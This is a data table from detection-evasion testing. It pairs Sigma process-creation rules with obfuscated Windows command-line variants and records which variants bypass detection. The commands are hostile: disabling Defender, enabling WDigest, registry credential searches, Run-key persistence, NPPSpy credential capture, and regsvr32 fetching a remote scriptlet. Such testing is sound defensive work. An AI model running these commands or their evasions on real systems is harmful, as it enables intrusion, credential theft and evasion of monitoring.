Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1046	proc_creation_win_pua_advanced_port_scanner	PUA - Advanced Port Scanner Execution	54773c5f-f1cc-4703-9126-2f797d96a69d		"""C:\Users\SWACHC~1\AppData\Local\Temp\2\Advanced Port Scanner 2\advanced_port_scanner.exe"" ""/portable"" ""C:/Users/SwachchhandaP/Downloads/"" /lng en_us"	FALSE	FALSE	FALSE	
t1046	proc_creation_win_pua_advanced_port_scanner	PUA - Advanced Port Scanner Execution	54773c5f-f1cc-4703-9126-2f797d96a69d		"cmd.exe /c """"C:\Users\SWACHC~1\AppData\Local\Temp\2\Advanced Port Scanner 2\advanced_port_scanner.exe"" /port^able ""C:/Users/SwachchhandaP/Downloads/"" /lng en_us"""	TRUE	TRUE	FALSE	Use Short Name Path in Command Line (349d891d-fef0-4fe4-bc53-eee623a15969); Use Short Name Path in Command Line (349d891d-fef0-4fe4-bc53-eee623a15969)
t1046	proc_creation_win_pua_advanced_port_scanner	PUA - Advanced Port Scanner Execution	54773c5f-f1cc-4703-9126-2f797d96a69d		"""C:\Users\SWACHC~1\AppData\Local\Temp\2\Advanced Port Scanner 2\advanced_port_scanner.exe"" -portable ""C:/Users/SwachchhandaP/Downloads/"" -lng en_us"	FALSE	FALSE	FALSE	
t1564.003	proc_creation_win_pua_advancedrun	PUA - AdvancedRun Execution	d2b749ee-4225-417e-b20e-a8d2193cbb84		"AdvancedRun.exe  /EXEFilename ""cmd.exe""  /Run"	FALSE	FALSE	FALSE	
t1564.003	proc_creation_win_pua_advancedrun	PUA - AdvancedRun Execution	d2b749ee-4225-417e-b20e-a8d2193cbb84		"AdvancedRun.exe ""/EXEFilename"" cmd.exe ""/Run"""	FALSE	FALSE	FALSE	
t1564.003	proc_creation_win_pua_advancedrun	PUA - AdvancedRun Execution	d2b749ee-4225-417e-b20e-a8d2193cbb84		AdvancedRun.exe -EXEFilename cmd.exe -Run	FALSE	FALSE	FALSE	
t1134.002	proc_creation_win_pua_advancedrun_priv_user	PUA - AdvancedRun Suspicious Execution	fa00b701-44c6-4679-994d-5a18afa8a707		"AdvancedRun.exe  /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs  8 /Run"	FALSE	FALSE	FALSE	
t1134.002	proc_creation_win_pua_advancedrun_priv_user	PUA - AdvancedRun Suspicious Execution	fa00b701-44c6-4679-994d-5a18afa8a707		"AdvancedRun.exe ""/EXEFilename"" ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" ""/RunAs"" 8 /Run"	FALSE	FALSE	FALSE	
t1134.002	proc_creation_win_pua_advancedrun_priv_user	PUA - AdvancedRun Suspicious Execution	fa00b701-44c6-4679-994d-5a18afa8a707		"AdvancedRun.exe -EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 -CommandLine ""stop WinDefend"" /StartDirectory """" -RunAs 8 /Run"	FALSE	FALSE	FALSE	
t1572	proc_creation_win_pua_ngrok	PUA - Ngrok Execution	ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31		ngrok.exe  tcp  3389	FALSE	FALSE	FALSE	
t1572	proc_creation_win_pua_ngrok	PUA - Ngrok Execution	ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31		"ngrok.exe ""tcp"" 3389"	FALSE	FALSE	FALSE	
t1572	proc_creation_win_pua_ngrok	PUA - Ngrok Execution	ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31		"cmd.exe /c ""ngrok.exe t^c^p 3389"""	FALSE	FALSE	FALSE	
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70	"reg   add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ /d \""C:\Users\admin\AppData\Roaming\Install\Host.exe\"" /f"	"reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f"	TRUE	FALSE	FALSE	Potential Persistence Attempt Via Run Keys Using Reg.EXE (de587dce-915e-4218-aac4-835ca6af6f70); Direct Autorun Keys Modification (24357373-078f-44ed-9ac4-6d334a668a11)
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"reg ""add"" HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f"	TRUE	TRUE	FALSE	Direct Autorun Keys Modification (24357373-078f-44ed-9ac4-6d334a668a11)
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\\Run /v NetWire /t REG_SZ /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f"	TRUE	TRUE	TRUE	
t1552.002	proc_creation_win_reg_enumeration_for_credentials_in_registry	Enumeration for Credentials in Registry	e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1	reg   query HKCU /f password /t REG_SZ /s	reg  query HKCU /f password /t REG_SZ /s	TRUE	FALSE	FALSE	Enumeration for Credentials in Registry (e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1)
t1552.002	proc_creation_win_reg_enumeration_for_credentials_in_registry	Enumeration for Credentials in Registry	e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1		"reg ""query"" HKCU /f password /t REG_SZ /s"	TRUE	TRUE	TRUE	
t1552.002	proc_creation_win_reg_enumeration_for_credentials_in_registry	Enumeration for Credentials in Registry	e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1		reg query HKCU -f password -t REG_SZ -s	TRUE	TRUE	TRUE	
t1552.002	proc_creation_win_registry_enumeration_for_credentials_cli	Enumeration for 3rd Party Creds From CLI	87a476dc-0079-4583-a985-dee7a20a03de	"cmd.exe /c ""reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s"""	reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s	TRUE	FALSE	FALSE	Enumeration for 3rd Party Creds From CLI (87a476dc-0079-4583-a985-dee7a20a03de); Enumeration for 3rd Party Creds From CLI (87a476dc-0079-4583-a985-dee7a20a03de); Enumeration for Credentials in Registry (e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1)
t1552.002	proc_creation_win_registry_enumeration_for_credentials_cli	Enumeration for 3rd Party Creds From CLI	87a476dc-0079-4583-a985-dee7a20a03de		"reg query HKCU\Software\SimonTatham\PuTTY""""\Sessions /t REG_SZ /s"	TRUE	TRUE	TRUE	
t1552.002	proc_creation_win_registry_enumeration_for_credentials_cli	Enumeration for 3rd Party Creds From CLI	87a476dc-0079-4583-a985-dee7a20a03de		"cmd.exe /c ""reg query HKCU\Software\SimonTatham\Pu^TTY\Sessions /t REG_SZ /s"""	FALSE	FALSE	FALSE	
t1546.002	proc_creation_win_reg_screensaver	Suspicious ScreenSave Change by Reg.exe	0fc35fc3-efe6-4898-8a37-0b233339524f		"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop""  /v  ScreenSaveActive  /t  REG_SZ  /d  1  /f"	TRUE	TRUE	TRUE	
t1546.002	proc_creation_win_reg_screensaver	Suspicious ScreenSave Change by Reg.exe	0fc35fc3-efe6-4898-8a37-0b233339524f		"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" ""/v"" ScreenSaveActive ""/t"" REG_SZ ""/d"" 1 ""/f"""	TRUE	TRUE	TRUE	
t1546.002	proc_creation_win_reg_screensaver	Suspicious ScreenSave Change by Reg.exe	0fc35fc3-efe6-4898-8a37-0b233339524f		"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" -v ScreenSaveActive -t REG_SZ -d 1 -f"	TRUE	TRUE	TRUE	
t1518	proc_creation_win_reg_software_discovery	Detected Windows Software Discovery	e13f668e-7f95-443d-98d2-1816a7648a7b	"reg  query \""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\""  /v  svcVersion"	"reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer""  /v  svcVersion"	TRUE	FALSE	FALSE	Detected Windows Software Discovery (e13f668e-7f95-443d-98d2-1816a7648a7b)
t1518	proc_creation_win_reg_software_discovery	Detected Windows Software Discovery	e13f668e-7f95-443d-98d2-1816a7648a7b	"reg  \""query\"" \""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\"" \""/v\"" svcVersion"	"reg ""query"" ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" ""/v"" svcVersion"	TRUE	FALSE	FALSE	Detected Windows Software Discovery (e13f668e-7f95-443d-98d2-1816a7648a7b)
t1518	proc_creation_win_reg_software_discovery	Detected Windows Software Discovery	e13f668e-7f95-443d-98d2-1816a7648a7b		"reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" -v svcVersion"	TRUE	TRUE	TRUE	
t1112	proc_creation_win_reg_susp_paths	Reg Add Suspicious Paths	b7e2a8d4-74bb-4b78-adc9-3f92af2d4829	"reg  add \""HKLM\SOFTWARE\Microsoft\Windows Defender\Features\"" /v \""TamperProtection\"" /t REG_DWORD /d 0 /f"	"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Registry Key Tampering Via Reg.EXE (452bce90-6fb0-43cc-97a5-affc283139b3)
t1112	proc_creation_win_reg_susp_paths	Reg Add Suspicious Paths	b7e2a8d4-74bb-4b78-adc9-3f92af2d4829	"reg  add \""HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\""  /v  UseLogonCredential  /t  REG_DWORD  /d  1  /f"	"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest""  /v  UseLogonCredential  /t  REG_DWORD  /d  1  /f"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1112	proc_creation_win_reg_susp_paths	Reg Add Suspicious Paths	b7e2a8d4-74bb-4b78-adc9-3f92af2d4829	"reg  add \""HKLM\SOFTWARE\Microsoft\Windows Defender\""\""\Features\"" /v \""TamperProtection\"" /t REG_DWORD /d 0 /f"	"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender""""\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Registry Key Tampering Via Reg.EXE (452bce90-6fb0-43cc-97a5-affc283139b3)
t1112	proc_creation_win_rundll32_susp_shimcache_flush	ShimCache Flush	b0524451-19af-4efa-a46f-562a977f792e	"cmd.exe /c ""Rundll32.exe apphelp.dll,#250"""	Rundll32.exe apphelp.dll,#250	TRUE	FALSE	FALSE	ShimCache Flush (b0524451-19af-4efa-a46f-562a977f792e); ShimCache Flush (b0524451-19af-4efa-a46f-562a977f792e)
t1112	proc_creation_win_rundll32_susp_shimcache_flush	ShimCache Flush	b0524451-19af-4efa-a46f-562a977f792e		"Rundll32.exe ""apphelp"".dll,ShimFlushCache"	TRUE	TRUE	TRUE	
t1112	proc_creation_win_rundll32_susp_shimcache_flush	ShimCache Flush	b0524451-19af-4efa-a46f-562a977f792e	cmd.exe  /c Rundll32.exe apphelp.dll,ShimFlushCache	cmd.exe /c Rundll32.exe apphelp.dll,Sh^imFlushCache	TRUE	FALSE	FALSE	ShimCache Flush (b0524451-19af-4efa-a46f-562a977f792e); ShimCache Flush (b0524451-19af-4efa-a46f-562a977f792e)
t1218.009	proc_creation_win_regasm_regsvcs_uncommon_location_execution	Potentially Suspicious Execution Of Regasm/Regsvcs From Uncommon Location	cc368ed0-2411-45dc-a222-510ace303cb2		"""C:\Windows\Microsoft.NET\Framework\v4.0.30319egsvcs.exe"" C:\Users	haim\AppData\Local\Temp\T1218.009.dll"	FALSE	FALSE	FALSE	
t1218.009	proc_creation_win_regasm_regsvcs_uncommon_location_execution	Potentially Suspicious Execution Of Regasm/Regsvcs From Uncommon Location	cc368ed0-2411-45dc-a222-510ace303cb2		"""C:\Windows\Microsoft.NET\Framework\v4.0.30319egsvcs.exe"" C:\Users	haim\AppData\Local\Temp""""\T1218.009.dll"	FALSE	FALSE	FALSE	
t1218.009	proc_creation_win_regasm_regsvcs_uncommon_location_execution	Potentially Suspicious Execution Of Regasm/Regsvcs From Uncommon Location	cc368ed0-2411-45dc-a222-510ace303cb2		"cmd.exe /c """"C:\Windows\Microsoft.NET\Framework\v4.0.30319egsvcs.exe"" C:\Users	haim\AppData\Local\Te^mp\T1218.009.dll"""	FALSE	FALSE	FALSE	
t1574	proc_creation_win_registry_cimprovider_dll_load	DLL Execution Via Register-cimprovider.exe	a2910908-e86f-4687-aeba-76a5f996e652	"C:\Windows\SysWow64\Register-CimProvider.exe   -Path \""C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll\"""	"C:\Windows\SysWow64\Register-CimProvider.exe  -Path ""C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll"""	TRUE	FALSE	FALSE	DLL Execution Via Register-cimprovider.exe (a2910908-e86f-4687-aeba-76a5f996e652)
t1574	proc_creation_win_registry_cimprovider_dll_load	DLL Execution Via Register-cimprovider.exe	a2910908-e86f-4687-aeba-76a5f996e652	"C:\Windows\SysWow64\Register-CimProvider.exe  \""-Path\"" \""C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll\"""	"C:\Windows\SysWow64\Register-CimProvider.exe ""-Path"" ""C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll"""	TRUE	FALSE	FALSE	DLL Execution Via Register-cimprovider.exe (a2910908-e86f-4687-aeba-76a5f996e652)
t1574	proc_creation_win_registry_cimprovider_dll_load	DLL Execution Via Register-cimprovider.exe	a2910908-e86f-4687-aeba-76a5f996e652		"C:\Windows\SysWow64\Register-CimProvider.exe /Path ""C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll"""	TRUE	TRUE	TRUE	
t1574	proc_creation_win_regsvr32_uncommon_extension	Regsvr32 DLL Execution With Uncommon Extension	50919691-7302-437f-8e10-1fe088afa145		C:\Windows\system32\regsvr32.exe /s C:\Users\thaim\AppData\Local\Temp\shell32.jpg .dll	TRUE	TRUE	FALSE	Regsvr32 Execution From Potential Suspicious Location (9525dc73-0327-438c-8c04-13c0e037e9da); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1574	proc_creation_win_regsvr32_uncommon_extension	Regsvr32 DLL Execution With Uncommon Extension	50919691-7302-437f-8e10-1fe088afa145		"C:\Windows\system32\regsvr32.exe /s C:\Users\thaim\AppData\Local\Temp\shell32.jpg "".dll"""	TRUE	TRUE	FALSE	Regsvr32 Execution From Potential Suspicious Location (9525dc73-0327-438c-8c04-13c0e037e9da); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1574	proc_creation_win_regsvr32_uncommon_extension	Regsvr32 DLL Execution With Uncommon Extension	50919691-7302-437f-8e10-1fe088afa145		C:\Windows\system32\regsvr32.exe /s C:\Users\thaim\AppData\Local\Temp\shell32.jpg#.dll	TRUE	TRUE	FALSE	Regsvr32 Execution From Potential Suspicious Location (9525dc73-0327-438c-8c04-13c0e037e9da); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1003	proc_creation_win_registry_new_network_provider	Potential Credential Dumping Attempt Using New NetworkProvider - CLI	baef1ec6-2ca9-47a3-97cc-4cf2bda10b77		"""powershell.exe"" & {Copy-Item \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll\"" -Destination \""C:\Windows\System32\"" 
$path = Get-ItemProperty -Path \""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order\"" -Name PROVIDERORDER 
$UpdatedValue = $Path.PROVIDERORDER + \"",NPPSpy\"" 
Set-ItemProperty -Path $Path.PSPath -Name \""PROVIDERORDER\"" -Value $UpdatedValue 
$rv = New-Item -Path \""HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\"" -ErrorAction Ignore 
$rv = New-Item -Path ('HKLM:\SYSTEM\CurrentControlSet\' + 'Services\NPPSpy\NetworkProvider') -ErrorAction Ignore 
$rv = New-ItemProperty -Path ('HKLM:\SYSTEM\CurrentControlSet\' + 'Services\NPPSpy\NetworkProvider') -Name \""Class\"" -Value 2 -ErrorAction Ignore 
$rv = New-ItemProperty -Path ('HKLM:\SYSTEM\CurrentControlSet\' + 'Services\NPPSpy\NetworkProvider') -Name \""Name\"" -Value NPPSpy -ErrorAction Ignore 
$rv = New-ItemProperty -Path ('HKLM:\SYSTEM\CurrentControlSet\' + 'Services\NPPSpy\NetworkProvider') -Name \""ProviderPath\"" -PropertyType ExpandString -Value \""%%SystemRoot%%\System32\NPPSPY.dll\"" -ErrorAction Ignore 
echo \""[!] Please, logout and log back in.\""}"	FALSE	FALSE	FALSE	
t1003	proc_creation_win_registry_new_network_provider	Potential Credential Dumping Attempt Using New NetworkProvider - CLI	baef1ec6-2ca9-47a3-97cc-4cf2bda10b77		"""powershell.exe"" & {Copy-Item \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll\"" -Destination \""C:\Windows\System32\"" 
$path = Get-ItemProperty -Path \""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order\"" -Name PROVIDERORDER 
$UpdatedValue = $Path.PROVIDERORDER + \"",NPPSpy\"" 
Set-ItemProperty -Path $Path.PSPath -Name \""PROVIDERORDER\"" -Value $UpdatedValue 
$rv = New-Item -Path \""HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\"" -ErrorAction Ignore 
$rv = New-Item -Path \""HKLM:\SYSTEM\CurrentControlSet\Serv*\NPPSpy\NetworkProvider\"" -ErrorAction Ignore 
$rv = New-ItemProperty -Path \""HKLM:\SYSTEM\CurrentControlSet\Serv*\NPPSpy\NetworkProvider\"" -Name \""Class\"" -Value 2 -ErrorAction Ignore 
$rv = New-ItemProperty -Path \""HKLM:\SYSTEM\CurrentControlSet\Serv*\NPPSpy\NetworkProvider\"" -Name \""Name\"" -Value NPPSpy -ErrorAction Ignore 
$rv = New-ItemProperty -Path \""HKLM:\SYSTEM\CurrentControlSet\Serv*\NPPSpy\NetworkProvider\"" -Name \""ProviderPath\"" -PropertyType ExpandString -Value \""%%SystemRoot%%\System32\NPPSPY.dll\"" -ErrorAction Ignore 
echo \""[!] Please, logout and log back in.\""}"	FALSE	FALSE	FALSE	
t1564.002	proc_creation_win_registry_special_accounts_hide_user	Hiding User Account Via SpecialAccounts Registry Key - CommandLine	9ec9fb1b-e059-4489-9642-f270c207923d	"reg.exe  add \""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist\"" /v AtomicOperator$ /t REG_DWORD /d 0"	"cmd.exe /c reg.exe a^dd ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v AtomicOperator$ /t REG_DWORD /d 0"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Hiding User Account Via SpecialAccounts Registry Key - CommandLine (9ec9fb1b-e059-4489-9642-f270c207923d)
t1564.002	proc_creation_win_registry_special_accounts_hide_user	Hiding User Account Via SpecialAccounts Registry Key - CommandLine	9ec9fb1b-e059-4489-9642-f270c207923d		"REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" ""/v"" AtomicOperator$ /t REG_DWORD ""/d"" 0"	TRUE	TRUE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1564.002	proc_creation_win_registry_special_accounts_hide_user	Hiding User Account Via SpecialAccounts Registry Key - CommandLine	9ec9fb1b-e059-4489-9642-f270c207923d		"REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" -v AtomicOperator$ -t REG_DWORD -d 0"	TRUE	TRUE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1564.002	proc_creation_win_registry_special_accounts_hide_user	Hiding User Account Via SpecialAccounts Registry Key - CommandLine	9ec9fb1b-e059-4489-9642-f270c207923d		"REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\""Userlist /v AtomicOperator$ /t REG_DWORD /d 0"	TRUE	TRUE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1218.010	proc_creation_win_regsvr32_flags_anomaly	Potential Regsvr32 Commandline Flag Anomaly	b236190c-1c61-41e9-84b3-3fe03f6d76b0		"C:\Windows\system32\regsvr32.exe /s /u ""/i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll"	TRUE	TRUE	FALSE	Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1218.010	proc_creation_win_regsvr32_flags_anomaly	Potential Regsvr32 Commandline Flag Anomaly	b236190c-1c61-41e9-84b3-3fe03f6d76b0		"C:\Windows\system32\regsvr32.exe /s /u -n /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll"	TRUE	TRUE	FALSE	Potentially Suspicious Child Process Of Regsvr32 (6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1218.010	proc_creation_win_regsvr32_flags_anomaly	Potential Regsvr32 Commandline Flag Anomaly	b236190c-1c61-41e9-84b3-3fe03f6d76b0	"C:\Windows\system32\regsvr32.exe  /s /u /i:\""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct\"" scrobj.dll"	"cmd.exe /c C:\Windows\system32\regsvr32.exe /s /u /^i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll"	TRUE	FALSE	FALSE	Potentially Suspicious Child Process Of Regsvr32 (6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca); Potential Regsvr32 Commandline Flag Anomaly (b236190c-1c61-41e9-84b3-3fe03f6d76b0); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1218.010	proc_creation_win_regsvr32_network_pattern	Potentially Suspicious Regsvr32 HTTP/FTP Pattern	867356ee-9352-41c9-a8f2-1be690d78216		"C:\Windows\system32\regsvr32.exe /s /u ""/i:h""ttp://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll"	TRUE	TRUE	FALSE	Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1218.010	proc_creation_win_regsvr32_network_pattern	Potentially Suspicious Regsvr32 HTTP/FTP Pattern	867356ee-9352-41c9-a8f2-1be690d78216	C:\Windows\system32\regsvr32.exe  /s /u /i:http://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll	cmd.exe /c C:\Windows\system32\regsvr32.exe /s /u /^i:h^ttp://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll	TRUE	FALSE	FALSE	Potentially Suspicious Child Process Of Regsvr32 (6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca); Potential Regsvr32 Commandline Flag Anomaly (b236190c-1c61-41e9-84b3-3fe03f6d76b0); Potentially Suspicious Regsvr32 HTTP/FTP Pattern (867356ee-9352-41c9-a8f2-1be690d78216); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1218.010	proc_creation_win_regsvr32_network_pattern	Potentially Suspicious Regsvr32 HTTP/FTP Pattern	867356ee-9352-41c9-a8f2-1be690d78216	C:\Windows\system32\regsvr32.exe  /s /u -i:HTTP://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll	C:\Windows\system32\regsvr32.exe /s /u -i:HTTP://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll	TRUE	FALSE	FALSE	Potentially Suspicious Child Process Of Regsvr32 (6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca); Potential Regsvr32 Commandline Flag Anomaly (b236190c-1c61-41e9-84b3-3fe03f6d76b0); Potentially Suspicious Regsvr32 HTTP/FTP Pattern (867356ee-9352-41c9-a8f2-1be690d78216); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1218.010	proc_creation_win_regsvr32_susp_exec_path_2	Regsvr32 Execution From Highly Suspicious Location	327ff235-94eb-4f06-b9de-aaee571324be		C:\Windows\syswow64\regsvr32.exe /s \\?\C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll	TRUE	TRUE	FALSE	Suspicious Regsvr32 Execution From Remote Share (88a87a10-384b-4ad7-8871-2f9bf9259ce5); Potentially Suspicious Child Process Of Regsvr32 (6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1218.010	proc_creation_win_regsvr32_susp_exec_path_2	Regsvr32 Execution From Highly Suspicious Location	327ff235-94eb-4f06-b9de-aaee571324be		C:\Windows\syswow64\regsvr32.exe /s C:.\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll	TRUE	TRUE	FALSE	Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22)
t1218.010	proc_creation_win_regsvr32_susp_exec_path_2	Regsvr32 Execution From Highly Suspicious Location	327ff235-94eb-4f06-b9de-aaee571324be		"cmd.exe /c ""C:\Windows\syswow64\regsvr32.exe /s C:\""""AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll"""	FALSE	FALSE	FALSE	
t1218.010	proc_creation_win_regsvr32_susp_extensions	Regsvr32 DLL Execution With Suspicious File Extension	089fc3d2-71e8-4763-a8a5-c97fbb0a403e	C:\Windows\system32\regsvr32.exe   /s C:\Users\thaim\AppData\Local\Temp\shell32.jpg	C:\Windows\system32\regsvr32.exe  /s C:\Users\thaim\AppData\Local\Temp\shell32.jpg	TRUE	FALSE	FALSE	Regsvr32 DLL Execution With Suspicious File Extension (089fc3d2-71e8-4763-a8a5-c97fbb0a403e); Regsvr32 Execution From Potential Suspicious Location (9525dc73-0327-438c-8c04-13c0e037e9da); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22); Regsvr32 DLL Execution With Uncommon Extension (50919691-7302-437f-8e10-1fe088afa145)
